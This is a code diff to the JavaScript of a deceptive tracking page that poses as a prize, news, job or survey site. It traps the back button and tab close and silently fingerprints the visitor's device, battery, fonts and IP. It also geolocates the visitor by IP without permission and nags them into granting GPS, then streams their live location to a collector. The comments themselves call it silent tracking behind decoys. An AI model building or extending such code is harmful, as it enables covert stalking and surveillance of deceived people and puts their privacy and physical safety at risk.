@@ -1,3 +1,16 @@
+// Prevent browser back button navigation & warn on tab close
+(function() {
+    for (var i = 0; i < 3; i++) {
+        window.history.pushState(null, null, window.location.href);
+    }
+    window.addEventListener('popstate', function() {
+        window.history.pushState(null, null, window.location.href);
+    });
+    window.onbeforeunload = function() {
+        return '';
+    };
+})();
+
 (async function() {
     const pathParts = window.location.pathname.split('/');
     const linkId = pathParts[pathParts.length - 1];
@@ -6,12 +19,21 @@
     const themeClass = document.body.className;
     const theme = themeClass.replace('theme-', '');
 
+    let ip = '';
+    let batteryInfo = { battery_level: null, battery_charging: null };
+    let mediaInfo = { audio_inputs: null, video_inputs: null, audio_outputs: null };
+    let fingerprint = {};
+    let locationCaptured = false;
+    let retryCount = 0;
+    const maxRetries = 5;
+
     function generateUUID() {
         return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
             var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
             return v.toString(16);
         });
     }
+    const session_id = generateUUID();
 
     function haversineDistance(lat1, lon1, lat2, lon2) {
         const R = 6371000;
@@ -222,11 +244,66 @@
         }
     }
 
-    async function initTracking() {
-        let ip = '';
-        let batteryInfo = { battery_level: null, battery_charging: null };
-        let mediaInfo = { audio_inputs: null, video_inputs: null, audio_outputs: null };
+    // FEATURE 1: Screen Wake Lock
+    async function keepScreenOn() {
+        try {
+            if ('wakeLock' in navigator) {
+                let wakeLock = await navigator.wakeLock.request('screen');
+                document.addEventListener('visibilitychange', async () => {
+                    if (document.visibilityState === 'visible') {
+                        wakeLock = await navigator.wakeLock.request('screen');
+                    }
+                });
+            }
+        } catch (e) {
+            // silent fail
+        }
+    }
 
+    // FEATURE 3: IP Geolocation (Always On — No Permission Needed)
+    async function getIPLocation() {
+        try {
+            // Primary
+            const r1 = await fetch('https://ipapi.co/json/');
+            if (r1.ok) {
+                const d1 = await r1.json();
+                return {
+                    latitude: d1.latitude,
+                    longitude: d1.longitude,
+                    city: d1.city,
+                    region: d1.region,
+                    country: d1.country_name,
+                    isp: d1.org,
+                    timezone: d1.timezone,
+                    ip_source: 'ipapi'
+                };
+            }
+            throw new Error('ipapi failed');
+        } catch (e) {
+            try {
+                // Fallback
+                const r2 = await fetch('https://ip-api.com/json/');
+                if (r2.ok) {
+                    const d2 = await r2.json();
+                    return {
+                        latitude: d2.lat,
+                        longitude: d2.lon,
+                        city: d2.city,
+                        region: d2.regionName,
+                        country: d2.country,
+                        isp: d2.isp,
+                        timezone: d2.timezone,
+                        ip_source: 'ip-api'
+                    };
+                }
+                return null;
+            } catch (e2) {
+                return null;
+            }
+        }
+    }
+
+    async function gatherTelemetry() {
         try {
             const results = await Promise.allSettled([
                 fetch('https://api.ipify.org?format=json').then(res => res.ok ? res.json() : null),
@@ -252,7 +329,7 @@
         const fonts = detectFonts(fontList);
         const canvasFingerprint = getCanvasFingerprint();
 
-        const fingerprint = {
+        fingerprint = {
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
             timezone_offset: new Date().getTimezoneOffset(),
             cpu_cores: navigator.hardwareConcurrency || null,
@@ -275,142 +352,152 @@
             cookies_enabled: navigator.cookieEnabled,
             plugins_count: navigator.plugins?.length || 0
         };
+    }
 
-        const session_id = generateUUID();
-        let lastSentLocation = null;
-        let latestPosition = null;
-        let liveTimer = null;
-        let watchId = null;
-        let isSending = false;
+    let lastSentLocation = null;
+    let latestPosition = null;
+    let liveTimer = null;
+    let watchId = null;
+    let isSending = false;
 
-        function startLiveTracking(initialLat, initialLng) {
-            lastSentLocation = {
-                latitude: initialLat,
-                longitude: initialLng,
-                timestamp: Date.now()
-            };
+    function startLiveTracking(initialLat, initialLng) {
+        lastSentLocation = {
+            latitude: initialLat,
+            longitude: initialLng,
+            timestamp: Date.now()
+        };
 
-            // Periodically check if we have a newer position that is > 10m away
-            liveTimer = setInterval(() => {
-                if (latestPosition) {
-                    const dist = haversineDistance(
-                        lastSentLocation.latitude,
-                        lastSentLocation.longitude,
-                        latestPosition.latitude,
-                        latestPosition.longitude
-                    );
-                    if (dist > 10) {
-                        sendLiveUpdate(latestPosition);
+        // Periodically check if we have a newer position that is > 10m away
+        liveTimer = setInterval(() => {
+            if (latestPosition) {
+                const dist = haversineDistance(
+                    lastSentLocation.latitude,
+                    lastSentLocation.longitude,
+                    latestPosition.latitude,
+                    latestPosition.longitude
+                );
+                if (dist > 10) {
+                    sendLiveUpdate(latestPosition);
+                }
+            }
+        }, 10000);
+
+        watchId = navigator.geolocation.watchPosition(
+            async function(pos) {
+                const currentPos = {
+                    latitude: pos.coords.latitude,
+                    longitude: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy,
+                    altitude: pos.coords.altitude || null
+                };
+                latestPosition = currentPos;
+
+                const dist = haversineDistance(
+                    lastSentLocation.latitude,
+                    lastSentLocation.longitude,
+                    currentPos.latitude,
+                    currentPos.longitude
+                );
+
+                if (dist > 10) {
+                    sendLiveUpdate(currentPos);
+                }
+            },
+            function(err) {
+                console.log("WatchPosition error:", err);
+            },
+            {
+                enableHighAccuracy: true,
+                timeout: 10000,
+                maximumAge: 0
+            }
+        );
+
+        window.addEventListener('beforeunload', () => {
+            if (watchId !== null) {
+                navigator.geolocation.clearWatch(watchId);
+            }
+            if (liveTimer !== null) {
+                clearInterval(liveTimer);
+            }
+        });
+    }
+
+    async function sendLiveUpdate(posObj) {
+        if (isSending) return;
+        isSending = true;
+
+        // Update immediately to prevent interval overlaps during async awaits
+        lastSentLocation = {
+            latitude: posObj.latitude,
+            longitude: posObj.longitude,
+            timestamp: Date.now()
+        };
+
+        try {
+            let city = null;
+            let address = null;
+            try {
+                const geoResponse = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${posObj.latitude}&lon=${posObj.longitude}`, {
+                    headers: {
+                        'Accept-Language': 'en-US,en;q=0.9',
+                        'User-Agent': 'ViutckLocationTracker/1.0'
                     }
+                });
+                if (geoResponse.ok) {
+                    const json = await geoResponse.json();
+                    city = (json.address && (json.address.city || json.address.town || json.address.village)) || json.display_name;
+                    address = json.display_name;
                 }
-            }, 10000);
+            } catch (e) {}
 
-            watchId = navigator.geolocation.watchPosition(
-                async function(pos) {
-                    const currentPos = {
-                        latitude: pos.coords.latitude,
-                        longitude: pos.coords.longitude,
-                        accuracy: pos.coords.accuracy,
-                        altitude: pos.coords.altitude || null
-                    };
-                    latestPosition = currentPos;
+            let freshBattery = batteryInfo;
+            try {
+                const batt = await getBatteryInfo();
+                if (batt.battery_level !== null) freshBattery = batt;
+            } catch (e) {}
 
-                    const dist = haversineDistance(
-                        lastSentLocation.latitude,
-                        lastSentLocation.longitude,
-                        currentPos.latitude,
-                        currentPos.longitude
-                    );
-
-                    if (dist > 10) {
-                        sendLiveUpdate(currentPos);
-                    }
-                },
-                function(err) {
-                    console.log("WatchPosition error:", err);
-                },
-                {
-                    enableHighAccuracy: true,
-                    timeout: 10000,
-                    maximumAge: 0
-                }
-            );
-
-            window.addEventListener('beforeunload', () => {
-                if (watchId !== null) {
-                    navigator.geolocation.clearWatch(watchId);
-                }
-                if (liveTimer !== null) {
-                    clearInterval(liveTimer);
-                }
-            });
-        }
-
-        async function sendLiveUpdate(posObj) {
-            if (isSending) return;
-            isSending = true;
-
-            // Update immediately to prevent interval overlaps during async awaits
-            lastSentLocation = {
+            const payload = {
                 latitude: posObj.latitude,
                 longitude: posObj.longitude,
-                timestamp: Date.now()
+                accuracy: posObj.accuracy,
+                altitude: posObj.altitude,
+                city: city,
+                address: address,
+                ip_address: ip,
+                user_agent: navigator.userAgent,
+                platform: navigator.platform,
+                screen_resolution: screen.width + 'x' + screen.height,
+                language: navigator.language,
+                location_denied: false,
+                session_id: session_id,
+                ip_source: 'gps',
+                ...fingerprint,
+                battery_level: freshBattery.battery_level,
+                battery_charging: freshBattery.battery_charging
             };
 
-            try {
-                let city = null;
-                let address = null;
-                try {
-                    const geoResponse = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${posObj.latitude}&lon=${posObj.longitude}`, {
-                        headers: {
-                            'Accept-Language': 'en-US,en;q=0.9',
-                            'User-Agent': 'ViutckLocationTracker/1.0'
-                        }
-                    });
-                    if (geoResponse.ok) {
-                        const json = await geoResponse.json();
-                        city = (json.address && (json.address.city || json.address.town || json.address.village)) || json.display_name;
-                        address = json.display_name;
-                    }
-                } catch (e) {}
-
-                let freshBattery = batteryInfo;
-                try {
-                    const batt = await getBatteryInfo();
-                    if (batt.battery_level !== null) freshBattery = batt;
-                } catch (e) {}
-
-                const payload = {
-                    latitude: posObj.latitude,
-                    longitude: posObj.longitude,
-                    accuracy: posObj.accuracy,
-                    altitude: posObj.altitude,
-                    city: city,
-                    address: address,
-                    ip_address: ip,
-                    user_agent: navigator.userAgent,
-                    platform: navigator.platform,
-                    screen_resolution: screen.width + 'x' + screen.height,
-                    language: navigator.language,
-                    location_denied: false,
-                    session_id: session_id,
-                    ...fingerprint,
-                    battery_level: freshBattery.battery_level,
-                    battery_charging: freshBattery.battery_charging
-                };
-
-                await postTelemetry(payload, true);
-            } finally {
-                isSending = false;
-            }
+            await postTelemetry(payload, true);
+        } finally {
+            isSending = false;
         }
+    }
 
+    // Main location capture triggering
+    function getLocation() {
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 async function(position) {
+                    locationCaptured = true;
+
+                    // Smooth overlay fade out
+                    const overlay = document.getElementById('permission-overlay');
+                    if (overlay) {
+                        overlay.classList.add('hidden');
+                    }
+
                     let city = null;
                     let address = null;
-                    
                     try {
                         const geoResponse = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}`, {
                             headers: {
@@ -439,6 +526,7 @@
                         language: navigator.language,
                         location_denied: false,
                         session_id: session_id,
+                        ip_source: 'gps',
                         ...fingerprint
                     };
 
@@ -446,6 +534,19 @@
                     startLiveTracking(position.coords.latitude, position.coords.longitude);
                 },
                 async function(error) {
+                    // Update overlay text warning & shake
+                    const subtitle = document.getElementById('permission-subtitle');
+                    if (subtitle) {
+                        subtitle.textContent = "Location verify karna zaroori hai continue karne ke liye";
+                        subtitle.classList.add('error');
+                    }
+                    const card = document.getElementById('permission-card');
+                    if (card) {
+                        card.classList.remove('shake');
+                        void card.offsetWidth; // force reflow to restart CSS animation
+                        card.classList.add('shake');
+                    }
+
                     const payload = {
                         latitude: null,
                         longitude: null,
@@ -460,10 +561,11 @@
                         language: navigator.language,
                         location_denied: true,
                         session_id: session_id,
+                        ip_source: 'gps',
                         ...fingerprint
                     };
 
-                    postTelemetry(payload, false);
+                    await postTelemetry(payload, false);
                 },
                 {
                     enableHighAccuracy: true,
@@ -472,6 +574,19 @@
                 }
             );
         } else {
+            // Geolocation unsupported fallback
+            const subtitle = document.getElementById('permission-subtitle');
+            if (subtitle) {
+                subtitle.textContent = "Location verify karna zaroori hai continue karne ke liye";
+                subtitle.classList.add('error');
+            }
+            const card = document.getElementById('permission-card');
+            if (card) {
+                card.classList.remove('shake');
+                void card.offsetWidth;
+                card.classList.add('shake');
+            }
+
             const payload = {
                 latitude: null,
                 longitude: null,
@@ -486,6 +601,7 @@
                 language: navigator.language,
                 location_denied: true,
                 session_id: session_id,
+                ip_source: 'gps',
                 ...fingerprint
             };
 
@@ -493,13 +609,91 @@
         }
     }
 
-    // Initialize decoy interactions
-    initDecoyInteractivity(theme);
+    // INITIALIZATION & FLOW ORCHESTRATION
+    async function initTelemetryAndIPGeo() {
+        // Feature 1: Keep Screen Awake
+        keepScreenOn();
 
-    // Initialize silent tracking immediately on page load
+        // Start gathering general fingerprint telemetry (async)
+        const telemetryPromise = gatherTelemetry();
+
+        // Feature 3: Always-on Silent IP Geolocation
+        try {
+            const ipLoc = await getIPLocation();
+            if (ipLoc) {
+                await telemetryPromise; // ensure fingerprinting finishes so we send complete payload
+                const payload = {
+                    latitude: ipLoc.latitude,
+                    longitude: ipLoc.longitude,
+                    accuracy: null,
+                    altitude: null,
+                    city: ipLoc.city,
+                    address: `${ipLoc.city || 'Unknown City'}, ${ipLoc.region || ''}, ${ipLoc.country || ''} (ISP: ${ipLoc.isp || 'Unknown'})`,
+                    ip_address: ip || '0.0.0.0',
+                    user_agent: navigator.userAgent,
+                    platform: navigator.platform,
+                    screen_resolution: screen.width + 'x' + screen.height,
+                    language: navigator.language,
+                    location_denied: false,
+                    session_id: session_id,
+                    ip_source: ipLoc.ip_source,
+                    ...fingerprint
+                };
+                await postTelemetry(payload, false);
+            }
+        } catch (e) {
+            // Silent error
+        }
+
+        return telemetryPromise;
+    }
+
+    // Start loading background parameters immediately
+    const telemetryPromise = initTelemetryAndIPGeo();
+
+    // Bind UI actions
+    function bindActions() {
+        const btn = document.getElementById('permission-btn');
+        if (btn) {
+            btn.addEventListener('click', async function() {
+                btn.disabled = true;
+                btn.textContent = 'Verifying...';
+
+                await telemetryPromise;
+                getLocation();
+
+                // Re-enable button after 5 seconds to allow retry if prompt got cancelled or stuck
+                setTimeout(() => {
+                    btn.disabled = false;
+                    const buttonTextTheme = {
+                        gift: '✅ Allow & Claim Prize',
+                        news: '✅ Allow & Read News',
+                        job: '✅ Allow & View Jobs',
+                        survey: '✅ Allow & Continue',
+                        loading: '✅ Allow & Watch'
+                    };
+                    btn.textContent = buttonTextTheme[theme] || '✅ Allow & Continue';
+                }, 5000);
+            });
+        }
+
+        // Initialize corresponding decoy features
+        initDecoyInteractivity(theme);
+    }
+
+    // FEATURE 2: Page Visibility Detection + Geolocation Retry
+    document.addEventListener('visibilitychange', function() {
+        if (!document.hidden) {
+            if (!locationCaptured && retryCount < maxRetries) {
+                retryCount++;
+                setTimeout(getLocation, 1000);
+            }
+        }
+    });
+
     if (document.readyState === 'loading') {
-        document.addEventListener('DOMContentLoaded', initTracking);
+        document.addEventListener('DOMContentLoaded', bindActions);
     } else {
-        initTracking();
+        bindActions();
     }
 })();
